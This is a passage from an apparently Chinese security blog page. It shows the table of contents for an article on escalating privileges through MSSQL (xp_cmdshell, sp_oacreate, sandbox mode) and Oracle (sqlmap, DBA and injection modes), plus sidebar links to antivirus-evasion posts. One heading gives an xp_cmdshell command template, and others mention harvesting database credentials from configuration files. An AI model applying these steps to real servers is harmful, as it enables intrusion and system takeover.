href="#%E5%86%8D%E6%AC%A1%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%97%B6%EF%BC%8C%E5%B0%86%E4%BC%9A%E5%A4%B1%E8%B4%A5"><span class="toc-number">6.6.8.2.</span> <span class="toc-text">再次写入文件时，将会失败</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-xp-cmdshell-amp-sp-oacreate-amp-%E6%B2%99%E7%9B%92"><span class="toc-number">7.</span> <span class="toc-text">#MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8xp-cmdshell%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">7.0.1.</span> <span class="toc-text">1.使用xp_cmdshell进行提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%EF%BC%9A"><span class="toc-number">7.0.2.</span> <span class="toc-text">启用：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%EF%BC%9A"><span class="toc-number">7.0.3.</span> <span class="toc-text">关闭：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%EF%BC%9A"><span class="toc-number">7.0.4.</span> <span class="toc-text">执行：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%90%8C%E6%A0%B7%E5%9C%A8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">7.0.4.1.</span> <span class="toc-text">同样在配置文件中查看数据库的账号密码</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Navicat%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">7.0.4.2.</span> <span class="toc-text">Navicat连接数据库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4-EXEC-master-dbo-xp-cmdshell-%E2%80%98%E5%91%BD%E4%BB%A4%E2%80%99"><span class="toc-number">7.0.4.3.</span> <span class="toc-text">执行命令 EXEC master.dbo.xp_cmdshell ‘命令’</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%80%98%E8%8B%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%B0%86xp-cmshell%E8%AE%BE%E7%BD%AE%E4%B8%BA0%E5%85%B3%E9%97%AD"><span class="toc-number">7.0.4.4.</span> <span class="toc-text">倘若执行命令将xp_cmshell设置为0关闭</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%97%B6%EF%BC%8C%E5%B0%86%E4%B8%8D%E8%83%BD%E6%88%90%E5%8A%9F"><span class="toc-number">7.0.4.5.</span> <span class="toc-text">再次执行系统命令时，将不能成功</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Cxp-cmdshell%E5%85%B3%E9%97%AD%E4%BA%86%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%91%BD%E4%BB%A4%E5%90%AF%E5%8A%A8%EF%BC%8C%E5%8D%B3%E4%BD%BF%E5%A6%82%E6%9E%9C%E5%88%A0%E9%99%A4%E4%BA%86xp-cmdshell%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%8C%89%E5%BC%80%E5%A4%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E6%81%A2%E5%A4%8D"><span class="toc-number">7.0.4.6.</span> <span class="toc-text">如果xp_cmdshell关闭了，可以用命令启动，即使如果删除了xp_cmdshell，可以按开头的命令进行恢复</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B9%9F%E4%B8%80%E6%A0%B7%E5%8F%AF%E4%BB%A5%E7%94%A8msf%E7%9B%B4%E6%8E%A5%E6%8F%90%E6%9D%83"><span class="toc-number">7.0.4.7.</span> <span class="toc-text">也一样可以用msf直接提权</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8sp-oacreate%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%E6%B2%A1%E6%9C%89xp-cmdshell%E6%96%B9%E4%BE%BF%EF%BC%89"><span class="toc-number">7.0.5.</span> <span class="toc-text">2.使用sp_oacreate进行提权（无回显没有xp_cmdshell方便）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%EF%BC%9A-1"><span class="toc-number">7.0.6.</span> <span class="toc-text">启用：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%EF%BC%9A-1"><span class="toc-number">7.0.7.</span> <span class="toc-text">关闭：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%EF%BC%9A-1"><span class="toc-number">7.0.8.</span> <span class="toc-text">执行：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Cxp-cmdshell%E5%85%B3%E9%97%AD%E4%BA%86%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95sp-oacreate%EF%BC%8C%E5%90%8C%E6%A0%B7%E6%9C%89%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%8C%E4%B8%8B%E9%9D%A2%E5%B0%86whoami%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E7%BB%93%E6%9E%9C%E5%86%99%E5%85%A51-txt"><span class="toc-number">7.0.8.1.</span> <span class="toc-text">如果xp_cmdshell关闭了，可以尝试sp_oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1.txt</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%88%90%E5%8A%9F%E5%86%99%E5%85%A5"><span class="toc-number">7.0.8.2.</span> <span class="toc-text">发现成功写入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E4%B8%BAsystem"><span class="toc-number">7.0.8.3.</span> <span class="toc-text">权限为system</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%90%8C%E6%A0%B7%E5%A6%82%E6%9E%9C%E5%85%B3%E9%97%AD%E4%BA%86sp-oacreate"><span class="toc-number">7.0.8.4.</span> <span class="toc-text">同样如果关闭了sp_oacreate</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BC%9A%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">7.0.8.5.</span> <span class="toc-text">会无法执行命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Csp-oacreate%E5%85%B3%E9%97%AD%E4%BA%86%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%91%BD%E4%BB%A4%E5%90%AF%E5%8A%A8"><span class="toc-number">7.0.8.6.</span> <span class="toc-text">如果sp_oacreate关闭了，也可以用命令启动</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8SQL-Server-%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83%EF%BC%88%E5%A6%82%E6%9E%9C%E5%89%8D%E9%9D%A2%E4%B8%A4%E4%B8%AA%E8%A1%8C%E4%B8%8D%E9%80%9A%EF%BC%89"><span class="toc-number">7.0.9.</span> <span class="toc-text">3.使用SQL Server 沙盒提权（如果前面两个行不通）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8C%89%E7%85%A7%E8%AF%AD%E5%8F%A5%E4%B8%80%E6%AD%A5%E6%AD%A5%E6%89%A7%E8%A1%8C%E5%8D%B3%E5%8F%AF"><span class="toc-number">7.0.9.1.</span> <span class="toc-text">按照语句一步步执行即可</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%A8%A1%E5%BC%8FSandBoxMode%E5%8F%82%E6%95%B0%E5%90%AB%E4%B9%89%EF%BC%88%E9%BB%98%E8%AE%A4%E6%98%AF2%EF%BC%89"><span class="toc-number">7.0.10.</span> <span class="toc-text">沙盒模式SandBoxMode参数含义（默认是2）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-amp-%E6%B3%A8%E5%85%A5%E6%8F%90%E5%8D%87%E6%A8%A1%E5%BC%8F-amp-DBA%E6%A8%A1%E5%BC%8F"><span class="toc-number">8.</span> <span class="toc-text">#Oracle-普通用户&amp;注入提升模式&amp;DBA模式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9C%A8sqlmap%E6%97%B6%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%E2%80%93os-shell%EF%BC%8C%E6%97%A0%E6%95%88"><span class="toc-number">8.0.1.</span> <span class="toc-text">Oracle数据库在sqlmap时不能使用–os-shell，无效</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%AD%98%E5%9C%A8%E4%BB%A5%E4%B8%8B%E4%B8%89%E7%A7%8D%E6%A8%A1%E5%BC%8F"><span class="toc-number">8.0.2.</span> <span class="toc-text">工具存在以下三种模式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F%EF%BC%9A"><span class="toc-number">8.0.3.</span> <span class="toc-text">1、普通用户模式：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81DBA%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F%EF%BC%9A%EF%BC%88%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E6%BC%94%E7%A4%BA%EF%BC%89"><span class="toc-number">8.0.4.</span> <span class="toc-text">2、DBA用户模式：（自动化工具演示）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E6%B3%A8%E5%85%A5%E6%8F%90%E5%8D%87%E6%A8%A1%E5%BC%8F%EF%BC%9A%EF%BC%88Sqlmap%E6%B5%8B%E8%AF%95%E6%BC%94%E7%A4%BA%EF%BC%89"><span class="toc-number">8.0.5.</span> <span class="toc-text">3、注入提升模式：（Sqlmap测试演示）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A4%A7%E9%83%A8%E5%88%86%E7%9A%84jsp%E8%AF%AD%E8%A8%80%E6%90%AD%E5%BB%BA%E7%9A%84%E8%8E%B7%E5%BE%97%E4%BA%86shell%E7%9B%B4%E6%8E%A5%E6%98%AFsystem%E6%9D%83%E9%99%90%EF%BC%8C%E9%99%A4%E4%BA%86%E5%B0%91%E6%95%B0"><span class="toc-number">8.0.5.1.</span> <span class="toc-text">大部分的jsp语言搭建的获得了shell直接是system权限，除了少数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%89%BE%E5%88%B0oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%89%BE%E5%88%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">8.0.5.2.</span> <span class="toc-text">这里找到oracle数据库配置文件找到账号密码</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8orac%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7"><span class="toc-number">8.0.5.3.</span> <span class="toc-text">使用orac提权工具</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%80%E5%BC%80%E5%A7%8B%E6%98%BE%E7%A4%BA%E5%A4%B1%E8%B4%A5%EF%BC%8C%E6%9B%B4%E6%8D%A2%E4%B8%BADBA%E6%A8%A1%E5%BC%8F"><span class="toc-number">8.0.5.4.</span> <span class="toc-text">一开始显示失败，更换为DBA模式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%91%E9%80%81payload%E6%88%90%E5%8A%9F%EF%BC%8C%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96syste%E6%9D%83%E9%99%90%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84DBA%E7%9A%84%E6%A8%A1%E5%BC%8F%E5%92%8C%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%BC%8F%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84%EF%BC%8C%E9%83%BD%E6%98%AF%E9%80%9A%E8%BF%87%E6%B3%A8%E5%85%A5%E6%9D%A5%E5%88%A4%E6%96%AD%E7%9A%84%EF%BC%8C%E4%B8%A4%E6%96%B9%E6%B3%95%E4%BA%92%E9%80%9A"><span class="toc-number">8.0.5.5.</span> <span class="toc-text">发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/" title="Day113 免杀对抗-内存加载&amp;API封装&amp;UUID标识&amp;MAC地址&amp;IPV4地址&amp;各语言">Day113 免杀对抗-内存加载&amp;API封装&amp;UUID标识&amp;MAC地址&amp;IPV4地址&amp;各语言</a><time datetime="2023-04-27T00:35:05.000Z" title="发表于 2023-04-27 08:35:05">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/" title="Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化">Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化</a><time datetime="2023-04-27T00:34:45.000Z" title="发表于 2023-04-27 08:34:45">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/" title="Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包">Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包</a><time datetime="2023-04-27T00:34:28.000Z" title="发表于 2023-04-27 08:34:28">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/" title="Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密">Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密</a><time datetime="2023-04-27T00:34:13.000Z" title="发表于 2023-04-27 08:34:13">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/" title="Day109 免杀对抗-PowerShell&amp;混淆&amp;分离加载&amp;特征修改&amp;EXE生成&amp;填充替换">Day109 免杀对抗-PowerShell&amp;混淆&amp;分离加载&amp;特征修改&amp;EXE生成&amp;填充替换</a><time datetime="2023-04-27T00:33:57.000Z" title="发表于 2023-04-27 08:33:57">2023-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By pwy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>